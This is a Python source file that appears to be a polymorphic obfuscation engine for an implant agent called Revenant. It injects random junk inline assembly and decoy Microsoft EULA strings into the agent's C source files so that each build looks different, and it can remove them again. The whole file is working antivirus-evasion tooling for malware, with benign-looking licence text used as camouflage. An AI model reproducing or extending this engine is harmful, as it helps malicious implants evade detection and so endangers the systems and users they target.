# Polymorphic inline assembly generator for Revenant
# A modified version of cycotic is a standalone project availible
# https://github.com/0xTriboulet/Cycotic
######################################################################################################
# This version of Cycotic is not a standalone script and should NOT be used seperately from Revenant #
######################################################################################################

import os
import re
import random

directory_path = "./Agent/Source/"

# x86
instructions_low_entropy_x86 = [
    "nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;",
    "inc eax;dec eax;inc eax;dec eax;inc eax;dec eax;inc eax;dec eax;inc eax;dec eax;inc eax;dec eax;",
    "xor eax, eax;xor ecx, ecx;xor eax, eax;xor ecx, ecx;xor eax, eax;xor ecx, ecx;xor eax, eax;xor ecx, ecx;",
    ''"xor eax,eax;" \
    "xor ecx,ecx;" \
    "xor eax,eax;" \
    "xor ecx,ecx;" \
    "xor eax,eax;" \
    "xor ecx,ecx;" \
    "xor eax,eax;"''
]



#x64
# Volatile registers: rax, rcx, rdx, r8, r9
instructions_low_entropy_x64 = [
    "xor rax, rax;xor rcx, rcx;xor rax, rax;xor rcx, rcx;xor rax, rax;xor rcx, rcx;xor rax, rax;xor rcx, rcx;",
    "inc rax;dec rax;inc rax;dec rax;inc rax;dec rax;inc rax;dec rax;inc rax;dec rax;inc rax;dec rax;inc rax;dec rax;",
    "cmp rax, rax;test rax, rax;cmp rax, rax;test rax, rax;cmp rax, rax;test rax, rax;cmp rax, rax;test rax, rax;",
    ''"pushfq;" \
    "push rcx;" \
    "push rdx;" \
    "push r8;" \
    "push r9;" \
    "xor eax, eax;" \
    "xor eax, eax;" \
    "xor ebx, ebx;" \
    "xor eax, eax;" \
    "xor eax, eax;" \
    "pop r9;" \
    "pop r8;" \
    "pop rdx;" \
    "pop rcx;" \
    "popfq;"''
]


# x86
instructions_x86 = [
    "nop;nop;nop;",
    "inc eax;dec eax;",
    "dec eax;inc eax;",
    "cmp eax, eax;",
    "test eax, eax;",
    "push eax;.byte 0xe8, 0x0, 0x0, 0x0, 0x0;.intel_syntax noprefix; pop eax; add eax, 0x6; push eax; ret; pop eax;"
    ''"pushfd;"
    "xchg ecx, eax;" \
    "xchg ecx, eax;" \
    "xchg ebx, eax;" \
    "xchg ebx, eax;" \
    "inc eax;" \
    "dec eax;" \
    "inc ebx;" \
    "dec ebx;" \
    "inc ecx;" \
    "dec ecx;" \
    "xchg ecx, ecx;" \
    "xchg ecx, eax;" \
    "xchg ebx, ebx;" \
    "xchg ebx, eax;"
    "popfd"''
]



#x64
# Volatile registers: rax, rcx, rdx, r8, r9
instructions_x64 = [
    "nop;nop;nop;",
    "inc rax;dec rax;",
    "dec rax;inc rax;",
    "cmp rax, rax;",
    "test rax, rax;",
    "push rax; lea rax, [rip]; add rax, 0x6; push rax; ret; pop rax;",
    ''"pushfq;" \
    "push rcx;" \
    "push rdx;" \
    "push r8;" \
    "push r9;" \
    "xchg eax, eax;" \
    "xchg eax, eax;" \
    "xchg ebx, ebx;" \
    "xchg eax, eax;" \
    "xchg eax, eax;" \
    "pop r9;" \
    "pop r8;" \
    "pop rdx;" \
    "pop rcx;" \
    "popfq;"''
]

eula = ["MICROSOFT SOFTWARE LICENSE TERMS", \
        "(MVLTECHNOLOGIES1.0 – STABLE CHANNEL)", \
        "MICROSOFT VISUAL STUDIO COMMUNITY 2019", \
        "These license terms are an agreement between", \
        "Microsoft Corporation (or based on where you live,", \
        "one of its affiliates) and you. Please read them.", \
        "They apply to the software named above, which", \
        "includes the media on which you received it, if", \
        "any. The terms also apply to any Microsoft", \
        "updates, supplements, Internet-based services,", \
        "and support services for this software, unless", \
        "other terms accompany those items. If so, those", \
        "terms apply. BY USING THE SOFTWARE, YOU ACCEPT", \
        "THESE TERMS. IF YOU DO NOT ACCEPT THEM, DO NOT", \
        "USE THE SOFTWARE. INSTEAD, RETURN IT TO THE", \
        "RESELLER FOR A REFUND OR CREDIT. As described", \
        "below, using the software also operates as your", \
        "consent to the transmission of certain", \
        "computer information for Internet-based", \
        "services, as described in the privacy", \
        "statement described in Section 3. If you", \
        "comply with these license terms, you have the", \
        "rights below. 1. INSTALLATION AND USE RIGHTS.", \
        "a. Individual license. If you are an individual", \
        "working on your own applications to sell or for", \
        "any other purpose, you may use the software to", \
        "develop and test those applications."]


def insert_asm_before_vars(file_contents, instructions):
    return_pattern = re.compile(r"^\s*(?P<type>\w+)\s+(?P<var_name>\w+)\s*=\s*(?P<value>[^;]+)\s*;", re.MULTILINE)

    def insert_asm(match):
        num_statements = random.randint(0, 5)
        asm_statements = "\n".join(
            "//remove me\n__asm(\".intel_syntax noprefix;{}\");".format(random.choice(instructions)) for _ in range(num_statements)
        )
        #print(asm_statements)
        return asm_statements + "\n" + match.group(0)

    modified_contents = return_pattern.sub(insert_asm, file_contents)

    return modified_contents


def insert_asm_statements(file_contents, instructions):
    modified_contents = insert_asm_before_vars(file_contents, instructions)

    function_pattern = re.compile(
        r"(?P<return_type>[\w\s\*]+)\s+(?P<func_name>\w+)\s*\((?P<params>[^\)]*)\)\s*\{",
        re.MULTILINE
    )

    def insert_asm(match):
        num_statements = random.randint(0, 5)
        asm_statements = "\n".join(
            "//remove me\n__asm(\".intel_syntax noprefix;{}\");".format(random.choice(instructions)) for _ in range(num_statements)
        )
        #print(asm_statements)
        return match.group(0) + "\n" + asm_statements

    modified_contents = function_pattern.sub(insert_asm, modified_contents)

    return modified_contents


def remove_asm_statements(file_contents):
    # Regex pattern to match and remove lines after "//remove me" comments
    remove_pattern = re.compile(r"//remove me\n.*;\n?", re.MULTILINE)
    modified_contents = remove_pattern.sub("", file_contents)
    return modified_contents



def insert_string_declarations(file_contents, eula):
    function_pattern = re.compile(
        r"(?P<return_type>[\w\s\*]+)\s+(?P<func_name>\w+)\s*\((?P<params>[^\)]*)\)\s*\{",
        re.MULTILINE
    )

    def insert_string(match):
        num_statements = random.randint(0, 5)
        string_statements = "\n".join(
            "//remove me\nchar* str{} = \"{}\";".format(random.randint(100, 99999), random.choice(eula)) for _ in range(num_statements)
        )
        return match.group(0) + "\n" + string_statements

    modified_contents = function_pattern.sub(insert_string, file_contents)

    return modified_contents


def remove_string_declarations(file_contents):
    # Regex pattern to match and remove lines after "//remove me" comments
    remove_pattern = re.compile(r"//remove me\nchar \*str\d+ = \".*?\";\n?", re.MULTILINE)
    modified_contents = remove_pattern.sub("", file_contents)
    return modified_contents


def process_c_file(file_path, instructions, eula, remove=False):
    with open(file_path, 'r') as input_file:
        file_contents = input_file.read()

    if remove:
        modified_contents = remove_asm_statements(file_contents)
        modified_contents = remove_string_declarations(modified_contents)
    else:
        modified_contents = insert_asm_statements(file_contents, instructions)
        modified_contents = insert_string_declarations(modified_contents, eula)

    with open(file_path, 'w') as output_file:
        output_file.write(modified_contents)


def process_directory(directory_path, instructions, eula, remove=False):
    for filename in os.listdir(directory_path):
        if filename.endswith('.c'):
            if filename in ["Poly.c","Utilities.c","Obfuscation.c","Asm.c","AntiDebug.c"]:
                #print(filename)
                modified_instructions = instructions[0:-1]
                #print(modified_instructions)
                file_path = os.path.join(directory_path, filename)
                process_c_file(file_path, modified_instructions, eula, remove)
            else:
                file_path = os.path.join(directory_path, filename)
                process_c_file(file_path, instructions, eula, remove)
